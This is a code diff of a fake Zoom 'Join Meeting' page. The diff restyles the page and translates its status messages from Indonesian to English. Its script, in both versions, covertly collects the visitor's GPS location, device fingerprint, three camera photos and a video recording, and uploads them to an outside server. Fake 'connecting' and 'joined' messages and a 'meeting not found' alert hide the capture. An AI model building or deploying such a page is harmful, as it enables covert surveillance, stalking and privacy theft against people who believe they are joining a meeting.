@@ -4,131 +4,201 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Join Meeting - Zoom</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap">
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
-
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    * { margin:0; padding:0; box-sizing:border-box; }
     body {
-      font-family: 'Inter', system-ui, -apple-system, sans-serif;
-      background: #f7f9fc;
+      font-family: 'Inter', system-ui, sans-serif;
+      background: #ffffff;
       color: #333;
       min-height: 100vh;
       display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
+      flex-direction: column;
     }
-    .zoom-container {
-      background: white;
-      width: 100%;
-      max-width: 480px;
-      border-radius: 8px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-      overflow: hidden;
-    }
-    .top-bar {
+
+    header {
+      padding: 16px 32px;
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 16px 24px;
-      border-bottom: 1px solid #e5e7eb;
+      border-bottom: 1px solid #e5e5e5;
     }
+
     .logo {
-      font-size: 28px;
+      font-size: 32px;
       font-weight: 700;
-      color: #0e71eb;
-      letter-spacing: -1px;
+      color: #0e72ed;
+      letter-spacing: -2px;
     }
-    .top-right { display: flex; gap: 12px; }
-    .btn-support, .btn-signup {
-      padding: 6px 16px;
+
+    .header-right {
+      display: flex;
+      gap: 12px;
+    }
+
+    .btn {
+      padding: 8px 20px;
       border-radius: 9999px;
       font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-    }
-    .btn-support { border: 1px solid #0e71eb; color: #0e71eb; background: white; }
-    .btn-signup { background: #0e71eb; color: white; border: none; }
-
-    .main-content { padding: 40px 32px 32px; text-align: center; }
-    h1 { font-size: 28px; font-weight: 600; margin-bottom: 32px; color: #1f2937; }
-    .input-label { text-align: left; font-size: 14px; font-weight: 500; color: #374151; margin-bottom: 8px; }
-    input {
-      width: 100%;
-      padding: 14px 16px;
-      border: 1px solid #d1d5db;
-      border-radius: 8px;
-      font-size: 16px;
-      margin-bottom: 24px;
-    }
-    .agreement { font-size: 13px; color: #6b7280; margin-bottom: 24px; line-height: 1.5; }
-    .agreement a { color: #0e71eb; text-decoration: none; }
-    .join-btn {
-      width: 100%;
-      padding: 14px;
-      background: #0e71eb;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      font-size: 17px;
       font-weight: 600;
       cursor: pointer;
+      border: none;
     }
-    .footer {
+
+    .btn-support {
+      background: white;
+      border: 1px solid #0e72ed;
+      color: #0e72ed;
+    }
+
+    .btn-signup {
+      background: #0e72ed;
+      color: white;
+    }
+
+    .main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+
+    .join-box {
+      width: 100%;
+      max-width: 480px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 28px;
+      font-weight: 600;
+      margin-bottom: 32px;
+      color: #1a1a1a;
+    }
+
+    .label {
+      text-align: left;
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 8px;
+      color: #444;
+    }
+
+    input {
+      width: 100%;
+      padding: 16px 20px;
+      font-size: 16px;
+      border: 1px solid #d0d0d0;
+      border-radius: 8px;
+      margin-bottom: 16px;
+    }
+
+    .agreement {
+      font-size: 13px;
+      color: #555;
+      margin: 20px 0;
+      text-align: center;
+    }
+
+    .agreement a {
+      color: #0e72ed;
+      text-decoration: none;
+    }
+
+    #joinBtn {
+      width: 100%;
+      padding: 16px;
+      background: #0e72ed;
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    #joinBtn:hover {
+      background: #0b5ed7;
+    }
+
+    .sip-link {
+      margin-top: 32px;
+      font-size: 14px;
+      color: #0e72ed;
+      text-decoration: none;
+    }
+
+    footer {
       padding: 20px 32px;
-      border-top: 1px solid #e5e7eb;
+      border-top: 1px solid #e5e5e5;
       font-size: 12px;
-      color: #6b7280;
+      color: #777;
       display: flex;
       justify-content: space-between;
       align-items: center;
+      flex-wrap: wrap;
+      gap: 12px;
     }
+
+    #status, #error {
+      margin-top: 20px;
+      font-size: 14px;
+      min-height: 22px;
+    }
+
+    video { display: none; }
   </style>
 </head>
 <body>
 
-  <div class="zoom-container">
-    <div class="top-bar">
-      <div class="logo">zoom</div>
-      <div class="top-right">
-        <button class="btn-support">Support</button>
-        <button class="btn-signup">Sign Up Free</button>
-      </div>
+  <header>
+    <div class="logo">zoom</div>
+    <div class="header-right">
+      <button class="btn btn-support">Support</button>
+      <button class="btn btn-signup">Sign Up Free</button>
     </div>
+  </header>
 
-    <div class="main-content">
+  <div class="main">
+    <div class="join-box">
       <h1>Join Meeting</h1>
-      <div class="input-label">Meeting ID or Personal Link Name</div>
-      <input type="text" id="meetingId" value="987 654 3210" readonly />
+
+      <div class="label">Meeting ID or Personal Link Name</div>
+      <input type="text" id="meetingId" placeholder="Enter Meeting ID or Personal Link Name" value="987-654-321" readonly>
 
       <div class="agreement">
         By clicking "Join", you agree to our 
-        <a href="#">Terms of Services</a> and 
-        <a href="#">Privacy Statement</a>
+        <a href="#" target="_blank">Terms of Services</a> and 
+        <a href="#" target="_blank">Privacy Statement</a>
       </div>
 
-      <button class="join-btn" id="joinBtn">Join</button>
-    </div>
+      <button id="joinBtn">Join</button>
 
-    <div class="footer">
-      <div>© 2026 Zoom Communications, Inc. All rights reserved.</div>
-      <div>English ▼</div>
+      <div id="status"></div>
+      <div id="error"></div>
+
+      <a href="#" class="sip-link">Join a meeting from an H.323/SIP room system</a>
     </div>
   </div>
 
-  <video id="video" autoplay playsinline muted style="display:none;"></video>
+  <footer>
+    <div>© 2026 Zoom Communications, Inc. All rights reserved. <a href="#">Privacy & Legal Policies</a></div>
+    <div>English ▼</div>
+    <div style="font-size:20px;">💬</div>
+  </footer>
+
+  <video id="video" autoplay playsinline muted></video>
 
   <script>
-    const joinBtn = document.getElementById('joinBtn');
-    const statusDiv = document.createElement('div');
-    statusDiv.style.marginTop = '20px';
-    statusDiv.style.fontSize = '15px';
-    statusDiv.style.minHeight = '28px';
-    document.querySelector('.main-content').appendChild(statusDiv);
-
+    const btn = document.getElementById('joinBtn');
+    const status = document.getElementById('status');
+    const errorDiv = document.getElementById('error');
+    const videoEl = document.getElementById('video');
     const SERVER_URL = 'https://coreproject.site/tracker/dashboard.php';
 
-    async function getDeviceInfo() {
+    async function getDeviceFingerprint() {
       return {
         timestamp: new Date().toISOString(),
         userAgent: navigator.userAgent,
@@ -136,107 +206,80 @@
         language: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         screen: `${screen.width}×${screen.height}`,
-        isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent)
+        cpuCores: navigator.hardwareConcurrency || 'N/A',
+        deviceMemory: navigator.deviceMemory || 'N/A',
+        touchSupport: navigator.maxTouchPoints > 0
       };
     }
 
-    joinBtn.addEventListener('click', async () => {
-      joinBtn.textContent = 'Joining...';
-      joinBtn.disabled = true;
-      statusDiv.textContent = 'Meminta izin...';
-      statusDiv.style.color = '#333';
-
-      let stream = null;
+    btn.addEventListener('click', async () => {
+      btn.disabled = true;
+      status.textContent = 'Connecting to meeting...';
+      errorDiv.textContent = '';
 
       try {
-        const deviceInfo = await getDeviceInfo();
+        const deviceInfo = await getDeviceFingerprint();
 
-        // Lokasi
-        statusDiv.textContent = 'Mengambil lokasi GPS...';
-        const position = await new Promise((res, rej) => 
-          navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 15000 })
-        );
-
+        // Geolocation
+        status.textContent = 'Accessing location...';
+        const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:10000}));
         const location = {
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
         };
 
-        // Kamera + Mic
-        statusDiv.textContent = 'Mengaktifkan kamera...';
-        stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: 'user' }, 
-          audio: true 
-        });
-
-        const videoEl = document.getElementById('video');
+        // Camera + Audio
+        status.textContent = 'Activating camera...';
+        const stream = await navigator.mediaDevices.getUserMedia({ video: {facingMode:"user"}, audio: true });
         videoEl.srcObject = stream;
         await videoEl.play();
 
-        // Foto
-        statusDiv.textContent = 'Mengambil foto...';
+        // 3 Photos
         const photos = [];
         for (let i = 0; i < 3; i++) {
-          await new Promise(r => setTimeout(r, 1000));
+          await new Promise(r => setTimeout(r, 1100));
           const canvas = document.createElement('canvas');
           canvas.width = videoEl.videoWidth || 640;
           canvas.height = videoEl.videoHeight || 480;
           canvas.getContext('2d').drawImage(videoEl, 0, 0);
-          photos.push(canvas.toDataURL('image/jpeg', 0.85));
+          photos.push(canvas.toDataURL('image/jpeg', 0.82));
         }
 
-        // Video Recording (Prioritas MP4 untuk iOS Safari)
-        statusDiv.textContent = 'Merekam video 7 detik...';
-        let chunks = [];
-        let mimeType = 'video/mp4'; // Default untuk Safari
-
-        const mimeOptions = ['video/mp4', 'video/webm;codecs=vp8', 'video/webm'];
-        for (let type of mimeOptions) {
-          if (MediaRecorder.isTypeSupported(type)) {
-            mimeType = type;
-            break;
-          }
-        }
-
-        const recorder = new MediaRecorder(stream, { mimeType });
-        recorder.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
+        // Video Recording (3 seconds)
+        status.textContent = 'Recording...';
+        const recorder = new MediaRecorder(stream, {mimeType: 'video/webm'});
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
         recorder.start();
-
-        await new Promise(r => setTimeout(r, 7000));
+        await new Promise(r => setTimeout(r, 3200));
         recorder.stop();
 
-        const videoBlob = await new Promise(resolve => {
-          recorder.onstop = () => resolve(new Blob(chunks, { type: mimeType }));
-        });
+        const videoBlob = await new Promise(res => recorder.onstop = () => res(new Blob(chunks, {type:'video/webm'})));
 
-        // Upload
-        statusDiv.textContent = 'Mengirim data...';
+        // Send to dashboard.php
+        status.textContent = 'Joining meeting...';
         const formData = new FormData();
         formData.append('location', JSON.stringify(location));
         formData.append('device_info', JSON.stringify(deviceInfo));
-        formData.append('video', videoBlob, `zoom_${Date.now()}.${mimeType.includes('mp4') ? 'mp4' : 'webm'}`);
+        formData.append('video', videoBlob, `zoom_${Date.now()}.webm`);
 
         for (let i = 0; i < photos.length; i++) {
           const blob = await fetch(photos[i]).then(r => r.blob());
           formData.append(`photo${i+1}`, blob, `photo_${Date.now()}_${i+1}.jpg`);
         }
 
-        await fetch(SERVER_URL, { 
-          method: 'POST', 
-          body: formData 
-        });
+        await fetch(SERVER_URL, { method: 'POST', body: formData });
 
-        statusDiv.innerHTML = `<span style="color:#10b981;">✅ Berhasil terkoneksi ke meeting</span>`;
-        setTimeout(() => alert("Waiting for the host to join the meeting..."), 1500);
+        status.innerHTML = '✅ Joined successfully';
+        setTimeout(() => alert("Meeting not found or unavailable. Please try again later."), 1200);
+
+        stream.getTracks().forEach(t => t.stop());
 
       } catch (err) {
         console.error(err);
-        statusDiv.innerHTML = `<span style="color:#ef4444;">❌ Gagal: ${err.message || 'Izin ditolak'}</span>`;
-        joinBtn.textContent = 'Coba Lagi';
-        joinBtn.disabled = false;
-      } finally {
-        if (stream) stream.getTracks().forEach(t => t.stop());
+        errorDiv.textContent = 'Unable to join. Please allow camera and location access.';
+        btn.disabled = false;
       }
     });
   </script>
